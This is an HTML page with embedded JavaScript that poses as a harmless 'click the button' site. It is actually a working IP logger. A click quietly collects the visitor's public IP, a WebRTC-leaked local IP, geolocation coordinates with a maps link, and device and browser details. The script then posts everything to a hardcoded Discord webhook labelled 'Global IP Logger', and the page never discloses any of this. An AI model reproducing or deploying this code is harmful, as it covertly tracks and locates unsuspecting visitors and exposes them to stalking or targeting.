<!DOCTYPE html>
<html>
<head>
    <title>click the button</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #4752C4; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
    </style>
</head>
<body>
    <h1>click the button website thing</h1>
    <p>click the button below:</p>
    
    <button id="trackButton">Click Me</button>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        async function getIPAddress() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ip.seeip.org/jsonip',
                'https://api.ip.sb/ip'
            ];
            
            for (const service of services) {
                try {
                    const res = await fetch(service, { timeout: 3000 });
                    const data = await res.json();
                    if (data.ip) return data.ip;
                } catch (e) {
                    continue;
                }
            }
            return 'Unknown';
        }
        
        async function getGlobalLocation(ip) {
            const apis = [
                {
                    name: 'ipapi.co',
                    url: `https://ipapi.co/${ip}/json/`,
                    parse: (data) => ({
                        lat: data.latitude,
                        lon: data.longitude,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        isp: data.org,
                        zip: data.postal,
                        timezone: data.timezone,
                        currency: data.currency,
                        calling_code: data.country_calling_code
                    })
                },
                {
                    name: 'ip-api.com',
                    url: `http://ip-api.com/json/${ip}`,
                    parse: (data) => ({
                        lat: data.lat,
                        lon: data.lon,
                        city: data.city,
                        region: data.regionName,
                        country: data.country,
                        isp: data.isp,
                        zip: data.zip,
                        timezone: data.timezone,
                        currency: data.currency,
                        calling_code: data.countryCode ? `+${data.countryCode}` : null
                    })
                },
                {
                    name: 'freegeoip.app',
                    url: `https://freegeoip.app/json/${ip}`,
                    parse: (data) => ({
                        lat: data.latitude,
                        lon: data.longitude,
                        city: data.city,
                        region: data.region_name,
                        country: data.country_name,
                        isp: data.isp,
                        zip: data.zip_code,
                        timezone: data.time_zone,
                        currency: data.currency ? data.currency.code : null,
                        calling_code: data.country_code
                    })
                }
            ];
            
            for (const api of apis) {
                try {
                    const res = await fetch(api.url);
                    const data = await res.json();
                    if (data && (data.latitude || data.lat)) {
                        const location = api.parse(data);
                        return {
                            ...location,
                            source: api.name,
                            success: true
                        };
                    }
                } catch (e) {
                    continue;
                }
            }
            
            return {
                lat: 'Unknown',
                lon: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                isp: 'Unknown',
                zip: 'Unknown',
                timezone: 'Unknown',
                currency: 'Unknown',
                calling_code: 'Unknown',
                source: 'Failed',
                success: false
            };
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            const languages = navigator.languages;
            const platform = navigator.platform;
            const vendor = navigator.vendor;
            const language = navigator.language;
            const cookies = navigator.cookieEnabled;
            const doNotTrack = navigator.doNotTrack;
            const online = navigator.onLine;
            const pdf = navigator.pdfViewerEnabled;
            const hardwareCores = navigator.hardwareConcurrency;
            const deviceMemory = navigator.deviceMemory;
            const maxTouch = navigator.maxTouchPoints;
            
            let device = 'Desktop';
            if (/mobile/i.test(ua)) device = 'Mobile';
            if (/tablet/i.test(ua)) device = 'Tablet';
            
            let os = 'Unknown';
            if (/windows/i.test(ua)) os = 'Windows';
            else if (/mac/i.test(ua)) os = 'macOS';
            else if (/linux/i.test(ua)) os = 'Linux';
            else if (/android/i.test(ua)) os = 'Android';
            else if (/ios|iphone|ipad/i.test(ua)) os = 'iOS';
            
            let browser = 'Unknown';
            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
            else if (/firefox/i.test(ua)) browser = 'Firefox';
            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
            else if (/edge/i.test(ua)) browser = 'Edge';
            else if (/opera/i.test(ua)) browser = 'Opera';
            
            return {
                device,
                os,
                browser,
                ua,
                languages: languages.join(', '),
                platform,
                vendor,
                language,
                cookies: cookies ? 'Enabled' : 'Disabled',
                doNotTrack: doNotTrack || 'Not set',
                online: online ? 'Online' : 'Offline',
                pdf: pdf ? 'Yes' : 'No',
                hardwareCores: hardwareCores || 'Unknown',
                deviceMemory: deviceMemory ? deviceMemory + ' GB' : 'Unknown',
                maxTouch
            };
        }
        
        async function getLocalIP() {
            return new Promise((resolve) => {
                if (!window.RTCPeerConnection) {
                    resolve('WebRTC not supported');
                    return;
                }
                
                const pc = new RTCPeerConnection({ iceServers: [] });
                const ips = [];
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                
                pc.onicecandidate = (event) => {
                    if (!event.candidate) {
                        if (ips.length) {
                            resolve(ips[0]);
                        } else {
                            resolve('Not detected');
                        }
                        return;
                    }
                    
                    const candidate = event.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(regex);
                    
                    if (match) {
                        const ip = match[1];
                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
                            (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
                            if (!ips.includes(ip)) {
                                ips.push(ip);
                            }
                        }
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips.length ? ips[0] : 'Not detected');
                }, 1000);
            });
        }
        
        function formatTime(date) {
            const day = date.getDate().toString().padStart(2, '0');
            const month = (date.getMonth() + 1).toString().padStart(2, '0');
            const year = date.getFullYear();
            const hours = date.getHours().toString().padStart(2, '0');
            const minutes = date.getMinutes().toString().padStart(2, '0');
            const seconds = date.getSeconds().toString().padStart(2, '0');
            
            return `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            
            button.disabled = true;
            button.textContent = 'Processing...';
            status.style.display = 'none';
            
            try {
                const publicIP = await getIPAddress();
                const localIP = await getLocalIP();
                const location = await getGlobalLocation(publicIP);
                const browserInfo = getBrowserInfo();
                const now = new Date();
                
                let mapsLink = 'No coordinates';
                if (location.lat !== 'Unknown' && location.lon !== 'Unknown') {
                    mapsLink = `https://www.google.com/maps/@${location.lat},${location.lon},15z`;
                }
                
                const embed = {
                    title: "IP LOGGED FROM " + location.country.toUpperCase(),
                    color: 0xFF0000,
                    fields: [
                        {
                            name: "NETWORK INFORMATION",
                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${location.isp}`,
                            inline: true
                        },
                        {
                            name: "GEOGRAPHICAL LOCATION",
                            value: `Country: ${location.country}\nRegion: ${location.region}\nCity: ${location.city}\nZIP: ${location.zip}\nTimezone: ${location.timezone}\nCurrency: ${location.currency}`,
                            inline: true
                        },
                        {
                            name: "COORDINATES",
                            value: `Latitude: ${location.lat}\nLongitude: ${location.lon}\nAccuracy: IP-based\nSource: ${location.source}\nMaps: ${mapsLink}`,
                            inline: true
                        },
                        {
                            name: "DEVICE & BROWSER",
                            value: `Device: ${browserInfo.device}\nOS: ${browserInfo.os}\nBrowser: ${browserInfo.browser}\nPlatform: ${browserInfo.platform}\nLanguage: ${browserInfo.language}`,
                            inline: true
                        },
                        {
                            name: "SYSTEM INFORMATION",
                            value: `CPU Cores: ${browserInfo.hardwareCores}\nRAM: ${browserInfo.deviceMemory}\nTouch Points: ${browserInfo.maxTouch}\nPDF Viewer: ${browserInfo.pdf}\nCookies: ${browserInfo.cookies}`,
                            inline: true
                        },
                        {
                            name: "TIME & SESSION",
                            value: `Local Time: ${formatTime(now)}\nUTC Time: ${now.toUTCString()}\nReferrer: ${document.referrer || 'Direct'}\nURL: ${window.location.href}\nUser Agent: \`\`\`${browserInfo.ua.substring(0, 300)}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Global IP Logger • Works in all countries • " + location.source
                    },
                    timestamp: now.toISOString()
                };
                
                const discordMessage = {
                    embeds: [embed],
                    username: "Global IP Logger"
                };
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                if (response.ok) {
                    status.textContent = 'Logged successfully. Check Discord.';
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = '#E8F5E9';
                } else {
                    throw new Error('Failed to send');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'Error. Please try again.';
                status.style.color = '#F44336';
                status.style.backgroundColor = '#FFEBEE';
            } finally {
                button.disabled = false;
                button.textContent = 'click me';
                status.style.display = 'block';
            }
        });
    </script>
</body>
</html>
